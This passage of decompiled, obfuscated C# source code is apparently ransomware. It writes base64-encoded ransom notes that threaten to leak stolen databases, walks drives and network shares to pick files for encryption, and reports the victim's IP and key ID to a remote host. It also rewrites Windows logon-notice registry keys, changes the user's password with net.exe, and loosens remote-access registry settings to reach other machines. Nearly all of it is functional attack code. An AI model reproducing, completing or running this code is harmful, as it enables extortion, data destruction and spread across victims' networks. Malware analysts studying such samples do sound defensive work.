WRlbnRpZmllciBhbmQgMiBmaWxlcywgdXAgdG8gMiBNQiBpbiBzaXplIGV2ZXJ5b25lLg0KICBXZSBkZWNpcGhlciB0aGVtLCBhcyBwcm9vZiBvZiBhIHBvc3NpYmlsaXR5IG9mIGludGVycHJldGF0aW9uLg0KICBhbHNvIHlvdSByZWNlaXZlIHRoZSBpbnN0cnVjdGlvbiB3aGVyZSBhbmQgaG93IG1hbnkgaXQgaXMgbmVjZXNzYXJ5IHRvIHBheS4NCg0KMi4geW91IHBheSBhbmQgY29uZmlybSBwYXltZW50Lg0KDQozLiBhZnRlciBwYXltZW50IHlvdSByZWNlaXZlIHRoZSBERUNPREVSIHByb2dyYW0uIHdoaWNoIHlvdSByZXN0b3JlIEFMTCBZT1VSIEZJTEVTLg0KLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KDQpXZSBkb3dubG9hZGVkIHlvdXIgZGF0YWJhc2VzLCBkYXRhIG9mIHlvdXIgZW1wbG95ZWVzLCB5b3VyIGN1c3RvbWVycywgZXRjLg0KSWYgeW91IGFuZCBJIGRvIG5vdCBhZ3JlZSwgeW91ciBkYXRhIHdpbGwgYmUgbWFkZSBwdWJsaWMhDQpXZSdsbCBnaXZlIGFjY2VzcyB0byBvdGhlciBoYWNrZXJzLg0KV2Ugd2lsbCBwdWJsaWNpemUgdGhlIG1lZGlhLiBTbyBhdHRlbnRpb24gaXMgcHJvdmlkZWQgdG8geW91Lg0KQnV0IEkgdGhpbmsgd2UnbGwgbWFrZSBhIGRlYWwu"));
				streamWriter.WriteLine("\r\n");
				streamWriter.WriteLine(agZtqMkMayfivgE("S2V5IElkZW50aWZpZXI6IA=="));
				streamWriter.WriteLine(DYXHJtaAOAj);
				if (YCgDOWQTASnYBU == "NO")
				{
					streamWriter.WriteLine("\r\n");
					streamWriter.WriteLine(agZtqMkMayfivgE("TnVtYmVyIG9mIGZpbGVzIHRoYXQgd2VyZSBwcm9jZXNzZWQgaXM6IA==") + Convert.ToString(HUJfkxnbjYLg.Count));
				}
				if (ZKQhNlGAfwnU)
				{
					streamWriter.WriteLine("\r\n");
					streamWriter.WriteLine(agZtqMkMayfivgE("UEMgSGFyZHdhcmUgSUQ6IA=="));
					streamWriter.WriteLine(hmdnzLvPRv.fVoScpXlDYrrq());
				}
			}
			else
			{
				string text11 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\RESTORE_FILES_INFO.txt");
				if (!text11.Contains(DYXHJtaAOAj) && !QHRYFfpHvmAnP)
				{
					File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\RESTORE_FILES_INFO.txt", "\r\nAdditional KeyId:\r\n" + DYXHJtaAOAj);
				}
			}
		}
		catch
		{
		}
		int num = 0;
		foreach (string item in mmgceOUJLT)
		{
			num++;
			try
			{
				if (item == Environment.GetFolderPath(Environment.SpecialFolder.Desktop))
				{
					continue;
				}
			}
			catch
			{
			}
			try
			{
				if (!File.Exists(item + "\\RESTORE_FILES_INFO.txt"))
				{
					File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\RESTORE_FILES_INFO.txt", item + "\\RESTORE_FILES_INFO.txt", overwrite: true);
				}
				else
				{
					string text12 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\RESTORE_FILES_INFO.txt");
					if (!text12.Contains(DYXHJtaAOAj) && !QHRYFfpHvmAnP)
					{
						File.AppendAllText(item + "\\RESTORE_FILES_INFO.txt", "\r\nAdditional KeyId:\r\n" + DYXHJtaAOAj);
					}
				}
			}
			catch (Exception)
			{
			}
			if (!dZmeCkKbjiaW && num > 10)
			{
				break;
			}
		}
		if (AqzCjOIAsEwJB == "YES")
		{
			try
			{
				if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\RESTORE_FILES_INFO.hta"))
				{
					using StreamWriter streamWriter2 = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\RESTORE_FILES_INFO.hta");
					streamWriter2.WriteLine(agZtqMkMayfivgE("MESSAGERICH"));
					streamWriter2.WriteLine("\r\n");
					streamWriter2.WriteLine(agZtqMkMayfivgE("PHAgc3R5bGU9InRleHQtYWxpZ246IGNlbnRlcjsiPktleSBJZGVudGlmaWVyOiA="));
					streamWriter2.WriteLine(DYXHJtaAOAj + agZtqMkMayfivgE("PC9wPg=="));
					if (YCgDOWQTASnYBU == "NO")
					{
						streamWriter2.WriteLine("\r\n");
						streamWriter2.WriteLine(agZtqMkMayfivgE("PHAgc3R5bGU9InRleHQtYWxpZ246IGNlbnRlcjsiPg==") + agZtqMkMayfivgE("TnVtYmVyIG9mIGZpbGVzIHRoYXQgd2VyZSBwcm9jZXNzZWQgaXM6IA==") + Convert.ToString(HUJfkxnbjYLg.Count) + agZtqMkMayfivgE("PC9wPg=="));
					}
					if (ZKQhNlGAfwnU)
					{
						streamWriter2.WriteLine("\r\n");
						streamWriter2.WriteLine(agZtqMkMayfivgE("UEMgSGFyZHdhcmUgSUQ6IA=="));
						streamWriter2.WriteLine(hmdnzLvPRv.fVoScpXlDYrrq());
					}
				}
				else
				{
					string text13 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\RESTORE_FILES_INFO.txt");
					if (!text13.Contains(DYXHJtaAOAj) && !QHRYFfpHvmAnP)
					{
						File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\RESTORE_FILES_INFO.hta", agZtqMkMayfivgE("PHAgc3R5bGU9InRleHQtYWxpZ246IGNlbnRlcjsiPg==") + "\r\nAdditional KeyId:\r\n" + DYXHJtaAOAj + agZtqMkMayfivgE("PC9wPg=="));
					}
				}
			}
			catch
			{
			}
		}
		if (PNBWyvAPRWrU == "YES")
		{
			try
			{
				if (YCgDOWQTASnYBU == "NO")
				{
					hmdnzLvPRv.cduldQuQGIEsss("URL", "USERNAME", "ACCESO", string.Concat(agZtqMkMayfivgE("Q2xpZW50IElQOiA="), new WebClient().DownloadString(agZtqMkMayfivgE("aHR0cDovL2ljYW5oYXppcC5jb20=")), "\r", agZtqMkMayfivgE("RGF0ZSBvZiBlbmNyeXB0aW9uOiA="), DateTime.Now, "\r\n", agZtqMkMayfivgE("UG9zc2libGUgYWZmZWN0ZWQgZmlsZXM6IA=="), Convert.ToString(HUJfkxnbjYLg.Count), "\r\n", agZtqMkMayfivgE("Q2xpZW50IFVuaXF1ZSBJZGVudGlmaWVyIEtleTog"), DYXHJtaAOAj));
				}
				else
				{
					hmdnzLvPRv.cduldQuQGIEsss("URL", "USERNAME", "ACCESO", string.Concat(agZtqMkMayfivgE("Q2xpZW50IElQOiA="), new WebClient().DownloadString(agZtqMkMayfivgE("aHR0cDovL2ljYW5oYXppcC5jb20=")), "\r", agZtqMkMayfivgE("RGF0ZSBvZiBlbmNyeXB0aW9uOiA="), DateTime.Now, "\r\n", agZtqMkMayfivgE("UG9zc2libGUgYWZmZWN0ZWQgZmlsZXM6IA=="), Convert.ToString(HUJfkxnbjYLg.Count), "\r\n", agZtqMkMayfivgE("Q2xpZW50IFVuaXF1ZSBJZGVudGlmaWVyIEtleTog"), DYXHJtaAOAj));
				}
			}
			catch
			{
			}
		}
		if (AgLFlMaswsW == "YES")
		{
			try
			{
				nxjXQQPmSsU.hXZUMoWJiF(new Uri(""));
			}
			catch
			{
			}
		}
		if (AqzCjOIAsEwJB == "NO")
		{
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\RESTORE_FILES_INFO.txt"))
				{
					Process.Start(agZtqMkMayfivgE("bm90ZXBhZC5leGU="), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\RESTORE_FILES_INFO.txt");
				}
			}
			catch
			{
			}
		}
		else
		{
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\RESTORE_FILES_INFO.hta"))
				{
					Process.Start(agZtqMkMayfivgE("bXNodGEuZXhl"), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\RESTORE_FILES_INFO.hta");
				}
			}
			catch
			{
			}
		}
		if (KOWNRAOhNTbHh == "YES")
		{
			if (vBaduAPxqot == "YES" && !string.IsNullOrEmpty(FaGAiVbpXFuGv) && !string.IsNullOrEmpty(HuZwHZTqsYcw))
			{
				nsQIywDogdYg(FaGAiVbpXFuGv, HuZwHZTqsYcw);
			}
			else
			{
				nsQIywDogdYg();
			}
		}
		if (lFEAqibzXp != "LOGONISOFF")
		{
			lEkZCiPitQipg(lFEAqibzXp);
		}
		if (!string.IsNullOrEmpty(QgAgVrOmAPN))
		{
			try
			{
				File.Delete(QgAgVrOmAPN);
			}
			catch
			{
			}
		}
		if (RxGWpvIgBdigX)
		{
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\RESTORE_FILES_INFO.txt"))
				{
					string kuNeoUyXGqcHcjey = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\RESTORE_FILES_INFO.txt");
					QHnEIDoPvsTlVG.PKAhnGOGYsYmZ(kuNeoUyXGqcHcjey);
				}
			}
			catch
			{
			}
		}
		try
		{
			if (File.Exists(Path.Combine(Directory.GetCurrentDirectory(), "Config.enc")))
			{
				File.Delete(Path.Combine(Directory.GetCurrentDirectory(), "Config.enc"));
			}
		}
		catch (Exception ex14)
		{
			try
			{
				File.AppendAllText(SlCyjezmzcjRF, "Error deleting config text file: " + ex14.Message);
			}
			catch (Exception)
			{
			}
		}
		if (bZJnUpHOpIgqq)
		{
			try
			{
				File.AppendAllText(SlCyjezmzcjRF, "All Done!");
			}
			catch (Exception)
			{
			}
		}
		if (iMnoJMeahQniKu == "EVET")
		{
			orYmYqWIcxewG();
		}
	}

	public static void UquwWAWwbeXBjt()
	{
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		MessageBox.Show(agZtqMkMayfivgE("VGhpcyBwcm9ncmFtIHJlcXVpcmVzIE1pY3Jvc29mdCAuTkVUIEZyYW1ld29yayB2LiA0LjgyIG9yIHN1cGVyaW9yIHRvIHJ1biBwcm9wZXJseQ=="), agZtqMkMayfivgE("SW5mb3JtYXRpb24uLi4="), (MessageBoxButtons)0, (MessageBoxIcon)16);
	}

	private static int sIHGzVGFvNlp(int gUudJqGSApE, int aZyOlmkPmcLPe)
	{
		RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		byte[] array = new byte[4];
		rNGCryptoServiceProvider.GetBytes(array);
		int seed = BitConverter.ToInt32(array, 0);
		return new Random(seed).Next(gUudJqGSApE, aZyOlmkPmcLPe);
	}

	public static List<string> IqHvwZeNnat(string PuOBPeEIzSMEHy, string[] LHMWMMegojYnzrD, string kLMzwquEvznzq, string[] fdVqlkFKSbIZT, string hlJJxbFrDMKmpeb)
	{
		List<string> list = new List<string>();
		Stack<string> stack = new Stack<string>(20);
		stack.Push(PuOBPeEIzSMEHy);
		while (stack.Count > 0)
		{
			string text = stack.Pop();
			string[] directories;
			try
			{
				directories = Directory.GetDirectories(text);
			}
			catch
			{
				continue;
			}
			string[] array = null;
			try
			{
				if (!text.Contains("C:\\Program Files\\") && !text.Contains("C:\\Program Files (x86)\\") && !text.Contains(":\\Windows\\") && !text.ToLower().Contains("perflogs") && !text.ToLower().Contains("internet explorer") && !text.Contains(":\\ProgramData\\") && !text.Contains("\\AppData\\") && !text.ToLower().Contains("msocache") && !text.ToLower().Contains("system volume information") && !text.ToLower().Contains("boot") && !text.ToLower().Contains("tor browser") && !text.ToLower().Contains("mozilla") && !text.ToLower().Contains("appdata") && !text.ToLower().Contains("google chrome") && !text.ToLower().Contains("application data"))
				{
					array = Directory.GetFiles(text);
					goto IL_0155;
				}
			}
			catch
			{
			}
			continue;
			IL_0155:
			string[] array2 = array;
			foreach (string fileName in array2)
			{
				try
				{
					FileInfo fileInfo = new FileInfo(fileName);
					if (!fileInfo.FullName.Contains("autoexec.bat") && !fileInfo.FullName.Contains("desktop.ini") && !fileInfo.FullName.Contains("autorun.inf") && !fileInfo.FullName.Contains("ntuser.dat") && !fileInfo.FullName.Contains("NTUSER.DAT") && !fileInfo.FullName.Contains("iconcache.db") && !fileInfo.FullName.Contains("bootsect.bak") && !fileInfo.FullName.Contains("boot.ini") && !fileInfo.FullName.Contains("ntuser.dat.log") && !fileInfo.FullName.Contains("thumbs.db") && !fileInfo.FullName.ToLower().Contains("bootmgr") && !fileInfo.FullName.ToLower().Contains("pagefile.sys") && !fileInfo.FullName.ToLower().Contains("config.sys") && !fileInfo.FullName.ToLower().Contains("ntuser.ini") && !fileInfo.FullName.Contains(agZtqMkMayfivgE("QnVpbGRlcl9Mb2c=")) && !fileInfo.FullName.Contains("RSAKeys") && !fileInfo.FullName.Contains("Config.enc") && !fileInfo.FullName.Contains("RESTORE_FILES_INFO") && !fileInfo.FullName.EndsWith(".ltnuhr") && !fileInfo.FullName.EndsWith("exe") && !fileInfo.FullName.EndsWith("dll") && !fileInfo.FullName.EndsWith("EXE") && !fileInfo.FullName.EndsWith("DLL") && !fileInfo.FullName.Contains("Recycle.Bin") && !fileInfo.FullName.Contains(ZJFGqhHHen) && !fileInfo.FullName.Contains(SlCyjezmzcjRF) && !fileInfo.FullName.Contains(uLoFxWVggAfF))
					{
						if (File.Exists(fileInfo.FullName) && (double)fileInfo.Length <= double.Parse(GzxiPdZuaEvsB) * 1024.0 * 1024.0 && nJXwSRTfZcW == "YES")
						{
							list.Add(fileInfo.FullName);
							WHkZEoQAhesRi(list, LHMWMMegojYnzrD, kLMzwquEvznzq, fdVqlkFKSbIZT, hlJJxbFrDMKmpeb);
							list.Clear();
						}
						else if (File.Exists(fileInfo.FullName) && nJXwSRTfZcW == "NO")
						{
							list.Add(fileInfo.FullName);
							WHkZEoQAhesRi(list, LHMWMMegojYnzrD, kLMzwquEvznzq, fdVqlkFKSbIZT, hlJJxbFrDMKmpeb);
							list.Clear();
						}
					}
				}
				catch
				{
				}
			}
			string[] array3 = directories;
			foreach (string item in array3)
			{
				stack.Push(item);
			}
		}
		return list;
	}

	public static List<string> rZyyAPmQsUEDO(string CEOaQcpRAa)
	{
		List<string> list = new List<string>();
		DirectoryInfo directoryInfo = new DirectoryInfo(CEOaQcpRAa);
		try
		{
			foreach (FileInfo item in directoryInfo.EnumerateFiles())
			{
				try
				{
					if (!item.FullName.Contains("C:\\Program Files\\") && !item.FullName.Contains("C:\\Program Files (x86)\\") && !item.FullName.Contains(":\\Windows\\") && !item.FullName.ToLower().Contains("perflogs") && !item.FullName.ToLower().Contains("internet explorer") && !item.FullName.Contains(":\\ProgramData\\") && !item.FullName.Contains("\\AppData\\") && !item.FullName.ToLower().Contains("autoexec.bat") && !item.FullName.ToLower().Contains("desktop.ini") && !item.FullName.ToLower().Contains("autorun.inf") && !item.FullName.ToLower().Contains("ntuser.dat") && !item.FullName.ToLower().Contains("iconcache.db") && !item.FullName.ToLower().Contains("bootsect.bak") && !item.FullName.ToLower().Contains("boot.ini") && !item.FullName.ToLower().Contains("ntuser.dat.log") && !item.FullName.ToLower().Contains("thumbs.db") && !item.FullName.ToLower().Contains("bootmgr") && !item.FullName.ToLower().Contains("pagefile.sys") && !item.FullName.ToLower().Contains("config.sys") && !item.FullName.ToLower().Contains("ntuser.ini") && !item.FullName.Contains(agZtqMkMayfivgE("QnVpbGRlcl9Mb2c=")) && !item.FullName.Contains("RSAKeys") && !item.FullName.Contains("RESTORE_FILES_INFO") && !item.FullName.EndsWith(".ltnuhr") && !item.FullName.EndsWith("exe") && !item.FullName.EndsWith("dll"))
					{
						if (File.Exists(item.FullName) && (double)item.Length <= double.Parse(GzxiPdZuaEvsB) * 1024.0 * 1024.0 && nJXwSRTfZcW == "YES")
						{
							list.Add(item.FullName);
						}
						else if (File.Exists(item.FullName) && nJXwSRTfZcW == "NO")
						{
							list.Add(item.FullName);
						}
					}
				}
				catch (UnauthorizedAccessException)
				{
				}
				catch
				{
				}
			}
			foreach (DirectoryInfo item2 in directoryInfo.EnumerateDirectories("*"))
			{
				if (directoryInfo.FullName.ToLower().Contains("program files") || directoryInfo.FullName.ToLower().Contains(":\\windows") || directoryInfo.FullName.ToLower().Contains("perflogs") || directoryInfo.FullName.ToLower().Contains("internet explorer") || directoryInfo.FullName.ToLower().Contains("programdata") || directoryInfo.FullName.ToLower().Contains("appdata"))
				{
					continue;
				}
				try
				{
					foreach (FileInfo item3 in item2.EnumerateFiles("*", SearchOption.AllDirectories))
					{
						try
						{
							if (!item3.FullName.ToLower().Contains("autoexec.bat") && !item3.FullName.ToLower().Contains("desktop.ini") && !item3.FullName.ToLower().Contains("autorun.inf") && !item3.FullName.ToLower().Contains("ntuser.dat") && !item3.FullName.ToLower().Contains("iconcache.db") && !item3.FullName.ToLower().Contains("bootsect.bak") && !item3.FullName.ToLower().Contains("boot.ini") && !item3.FullName.ToLower().Contains("ntuser.dat.log") && !item3.FullName.ToLower().Contains("thumbs.db") && !item3.FullName.ToLower().Contains("bootmgr") && !item3.FullName.ToLower().Contains("pagefile.sys") && !item3.FullName.ToLower().Contains("config.sys") && !item3.FullName.ToLower().Contains("ntuser.ini") && !item3.FullName.Contains(agZtqMkMayfivgE("QnVpbGRlcl9Mb2c=")) && !item3.FullName.Contains("RSAKeys") && !item3.FullName.Contains("RESTORE_FILES_INFO") && !item3.FullName.EndsWith(".ltnuhr") && !item3.FullName.EndsWith("exe") && !item3.FullName.EndsWith("dll"))
							{
								if (File.Exists(item3.FullName) && (double)item3.Length <= double.Parse(GzxiPdZuaEvsB) * 1024.0 * 1024.0 && nJXwSRTfZcW == "YES")
								{
									list.Add(item3.FullName);
								}
								else if (File.Exists(item3.FullName) && nJXwSRTfZcW == "NO")
								{
									list.Add(item3.FullName);
								}
							}
						}
						catch (UnauthorizedAccessException)
						{
						}
						catch
						{
						}
					}
				}
				catch (UnauthorizedAccessException)
				{
				}
				catch
				{
				}
			}
			return list;
		}
		catch (DirectoryNotFoundException)
		{
			return list;
		}
		catch (UnauthorizedAccessException)
		{
			return list;
		}
		catch (PathTooLongException)
		{
			return list;
		}
		catch
		{
			return list;
		}
	}

	public static void OKJeKejfXkZJUmj()
	{
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_0023: Unknown result type (might be due to invalid IL or missing references)
		//IL_0029: Expected O, but got Unknown
		ManagementObjectSearcher val = new ManagementObjectSearcher("select * from Win32_NetworkConnection");
		ManagementObjectEnumerator enumerator = val.Get().GetEnumerator();
		try
		{
			while (enumerator.MoveNext())
			{
				ManagementObject val2 = (ManagementObject)enumerator.get_Current();
				if (!ykYiTFCYjtGh.Contains(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace("\\\\", "\\").Replace("\\\\\\\\", "\\\\")
					.Replace("\"", "")
					.Split(new char[1] { '(' })[0].Trim()))
				{
					ykYiTFCYjtGh.Add(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace("\\\\", "\\").Replace("\\\\\\\\", "\\\\")
						.Replace("\"", "")
						.Split(new char[1] { '(' })[0].Trim().Replace("IPC$", ""));
				}
			}
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
	}

	public static string bhxKBVXCniiAP(string TOifMVvpijbR = "", string oTlTAbyXFLbFmT = "")
	{
		string result = "";
		try
		{
			Process process = new Process();
			process.StartInfo = new ProcessStartInfo
			{
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true,
				FileName = TOifMVvpijbR,
				Arguments = oTlTAbyXFLbFmT,
				UseShellExecute = false,
				RedirectStandardOutput = true,
				StandardOutputEncoding = Encoding.GetEncoding(850)
			};
			Process process2 = process;
			process2.Start();
			result = process2.StandardOutput.ReadToEnd();
			process2.WaitForExit(2500);
			process2.Kill();
			return result;
		}
		catch
		{
			return result;
		}
	}

	public static void RJzEqdmGtigGn(string nyadxUKMhaMdQVX)
	{
		Process process = new Process();
		process.StartInfo = new ProcessStartInfo
		{
			FileName = "powershell",
			Arguments = nyadxUKMhaMdQVX,
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true
		};
		Process process2 = process;
		process2.Start();
	}

	public static string pQwJuYtkrVyfmA(string gdWEgLTAYBiEUCw)
	{
		char[] array = gdWEgLTAYBiEUCw.ToCharArray();
		Array.Reverse((Array)array);
		return new string(array);
	}

	public static string agZtqMkMayfivgE(string gkNsMTzrXnlPn)
	{
		byte[] bytes = Convert.FromBase64String(gkNsMTzrXnlPn);
		return Encoding.UTF8.GetString(bytes);
	}

	public static void cyqoycsDxHnYq(string gqpOFrmndIDK = "", string OpbcIkqcoayE = "SW5mb3JtYXRpb24uLi4=", string zztWhMFpUjZf = "QWxsIHlvdXIgZmlsZXMgd2VyZSBlbmNyeXB0ZWQsIGlmIHlvdSB3YW50IHRvIGdldCB0aGVtIGFsbCBiYWNrLCBwbGVhc2UgY2FyZWZ1bGx5IHJlYWQgdGhlIHRleHQgbm90ZSBsb2NhdGVkIGluIHlvdXIgZGVza3RvcC4uLg==")
	{
		gqpOFrmndIDK = pQwJuYtkrVyfmA("=42bn9Gbul2Vc52bpNnclZFduVmcyV3QcRlTgM3dvRmbpdFX0Z2bz9mcjlWTcVkUBdFVG90U");
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(agZtqMkMayfivgE(gqpOFrmndIDK), writable: true);
			if (registryKey != null)
			{
				registryKey.SetValue(agZtqMkMayfivgE("TGVnYWxOb3RpY2VDYXB0aW9u"), agZtqMkMayfivgE(OpbcIkqcoayE));
				registryKey.SetValue(agZtqMkMayfivgE("TGVnYWxOb3RpY2VUZXh0"), agZtqMkMayfivgE(zztWhMFpUjZf));
				registryKey.Close();
			}
		}
		catch
		{
		}
		try
		{
			gqpOFrmndIDK = pQwJuYtkrVyfmA("tVGdzl3UcNXZpNWas9GUc52bpNnclZFduVmcyV3QcN3dvRmbpdFX0Z2bz9mcjlWTcVkUBdFVG90U");
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(agZtqMkMayfivgE(gqpOFrmndIDK), writable: true);
			if (registryKey != null)
			{
				registryKey.SetValue(agZtqMkMayfivgE("bGVnYWxub3RpY2VjYXB0aW9u"), agZtqMkMayfivgE(OpbcIkqcoayE));
				registryKey.SetValue(agZtqMkMayfivgE("bGVnYWxub3RpY2V0ZXh0"), agZtqMkMayfivgE(zztWhMFpUjZf));
				registryKey.Close();
			}
		}
		catch
		{
		}
	}

	public static void RUReOJudlAtO()
	{
		try
		{
			if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
			{
				if (vBaduAPxqot == "YES" && !string.IsNullOrEmpty(FaGAiVbpXFuGv) && !string.IsNullOrEmpty(HuZwHZTqsYcw))
				{
					cyqoycsDxHnYq("", FaGAiVbpXFuGv, HuZwHZTqsYcw);
				}
				else
				{
					cyqoycsDxHnYq();
				}
			}
		}
		catch
		{
		}
	}

	public static void nsQIywDogdYg(string WEUNhXhVXeVNnh = "SW5mb3JtYXRpb24uLi4=", string rpTUkkjUuBpm = "QWxsIHlvdXIgZmlsZXMgd2VyZSBlbmNyeXB0ZWQsIGlmIHlvdSB3YW50IHRvIGdldCB0aGVtIGFsbCBiYWNrLCBwbGVhc2UgY2FyZWZ1bGx5IHJlYWQgdGhlIHRleHQgbm90ZSBsb2NhdGVkIGluIHlvdXIgZGVza3RvcC4uLg==")
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		NotifyIcon val = new NotifyIcon();
		val.set_Icon(SystemIcons.get_Warning());
		val.set_Visible(true);
		val.set_BalloonTipIcon((ToolTipIcon)2);
		val.set_BalloonTipTitle(agZtqMkMayfivgE(WEUNhXhVXeVNnh));
		val.set_BalloonTipText(agZtqMkMayfivgE(rpTUkkjUuBpm));
		val.ShowBalloonTip(30000);
	}

	public static void lEkZCiPitQipg(string kQnfttPWaEgM)
	{
		string text = WindowsIdentity.GetCurrent().Name.Split(new char[1] { '\\' })[1].ToString();
		bhxKBVXCniiAP(agZtqMkMayfivgE("bmV0LmV4ZQ=="), "user " + text + " " + kQnfttPWaEgM);
	}

	public static List<string> NDSSMcLDnsRssLC()
	{
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0033: Expected O, but got Unknown
		ManagementClass val = new ManagementClass("Win32_Share");
		List<string> list = new List<string>();
		try
		{
			ManagementObjectCollection instances = val.GetInstances();
			ManagementObjectEnumerator enumerator = instances.GetEnumerator();
			try
			{
				while (enumerator.MoveNext())
				{
					ManagementObject val2 = (ManagementObject)enumerator.get_Current();
					object obj = ((ManagementBaseObject)val2).get_Item("Name");
					if (!list.Contains("\\\\" + val2.get_Path().get_Server() + "\\" + obj.ToString()!.Replace("IPC$", "").Replace("ADMIN$", "")))
					{
						list.Add("\\\\" + val2.get_Path().get_Server() + "\\" + obj.ToString()!.Replace("IPC$", "").Replace("ADMIN$", ""));
					}
				}
				return list;
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
		}
		catch
		{
			return null;
		}
	}

	private static void udvmXwBMJqDyi()
	{
		//IL_0207: Unknown result type (might be due to invalid IL or missing references)
		//IL_020e: Expected O, but got Unknown
		//IL_0230: Unknown result type (might be due to invalid IL or missing references)
		//IL_0237: Expected O, but got Unknown
		oZLuSlWBWyPTCv();
		List<vlYGhyibgRfG> list = vlYGhyibgRfG.YqQCzkEkPjyUx();
		foreach (vlYGhyibgRfG item in list)
		{
			sTLtTCfquFXGm.Add(item.SqWGuRtuOIYayEl);
		}
		Parallel.ForEach(sTLtTCfquFXGm, delegate(string SrKJaAPPEgPd)
		{
			if ((!SrKJaAPPEgPd.StartsWith("10.") && !SrKJaAPPEgPd.StartsWith("172.") && !SrKJaAPPEgPd.StartsWith("192.168.") && !SrKJaAPPEgPd.StartsWith("")) || !ULIHMIqJVuh.SwFwRiZSJvGME(SrKJaAPPEgPd))
			{
				return;
			}
			try
			{
				Thread.Sleep(PRCzDJqMXxgFe);
				ykYiTFCYjtGh.Add("\\\\" + SrKJaAPPEgPd + "\\Users");
				try
				{
					if (hzzRDIjGDyq)
					{
						Console.WriteLine("\\\\" + SrKJaAPPEgPd + "\\Users");
					}
				}
				catch
				{
				}
				Parallel.For(68, 91, delegate(int g)
				{
					Thread.Sleep(PRCzDJqMXxgFe);
					ykYiTFCYjtGh.Add("\\\\" + SrKJaAPPEgPd + "\\" + (char)g + "$");
					try
					{
						if (hzzRDIjGDyq)
						{
							Console.WriteLine("\\\\" + SrKJaAPPEgPd + "\\" + (char)g + "$");
						}
					}
					catch
					{
					}
				});
			}
			catch
			{
			}
		});
		try
		{
			ULIHMIqJVuh.lBfgiIbaUpCP lBfgiIbaUpCP = new ULIHMIqJVuh.lBfgiIbaUpCP(ULIHMIqJVuh.FAQQdYJAfnjqw.eOHJIIRSPPC, ULIHMIqJVuh.BpqzcmaaNTzuFl.qzfpLQcTtGTLXlL, ULIHMIqJVuh.FCLFciAEkMh.MgQnwIMaPTBHLy, ULIHMIqJVuh.vqyjgkFlbaFegw.gFlPnfjcQRvRYfiX);
			foreach (string item2 in lBfgiIbaUpCP)
			{
				MatchCollection matchCollection = Regex.Matches(item2, "\\\\\\\\[a-zA-Z0-9\\.\\-_]{1,}(\\\\[a-zA-Z0-9\\-_]{1,}){1,}[\\$]{0,1}");
				foreach (Match item3 in matchCollection)
				{
					try
					{
						if (!ykYiTFCYjtGh.Contains(item3.ToString()))
						{
							ykYiTFCYjtGh.Add(item3.ToString());
						}
					}
					catch
					{
					}
					try
					{
						if (hzzRDIjGDyq)
						{
							Console.WriteLine(item3.ToString());
						}
					}
					catch
					{
					}
				}
			}
		}
		catch (Exception)
		{
		}
		zLFoIDTnIZbnFn.ZRlBzJiEkDTWk();
		try
		{
			if (hzzRDIjGDyq)
			{
				Console.WriteLine("Network scanning completed...");
			}
		}
		catch
		{
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			try
			{
				string gkNsMTzrXnlPn = pQwJuYtkrVyfmA("tVGdzl3UcNXZpNWas9GUc52bpNnclZFduVmcyV3QcN3dvRmbpdFX0Z2bz9mcjlWTcVkUBdFVG90U");
				RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(agZtqMkMayfivgE(gkNsMTzrXnlPn), writable: true);
				if (registryKey != null)
				{
					registryKey.SetValue(agZtqMkMayfivgE("TG9jYWxBY2NvdW50VG9rZW5GaWx0ZXJQb2xpY3k="), 1, RegistryValueKind.DWord);
					registryKey.SetValue(agZtqMkMayfivgE("RW5hYmxlTGlua2VkQ29ubmVjdGlvbnM="), 1, RegistryValueKind.DWord);
					registryKey.Close();
				}
			}
			catch
			{
			}
		}
		if (kZnwhBlPHreC == "YES")
		{
			pmodLucENaC.WkbyvRQCdtG();
		}
		try
		{
			if (hzzRDIjGDyq)
			{
				Console.WriteLine("Scanning for manually mapped resources...");
			}
		}
		catch
		{
		}
		ManagementObjectSearcher val = new ManagementObjectSearcher("select * from Win32_NetworkConnection");
		ManagementObjectEnumerator enumerator4 = val.Get().GetEnumerator();
		try
		{
			while (enumerator4.MoveNext())
			{
				ManagementObject val2 = (ManagementObject)enumerator4.get_Current();
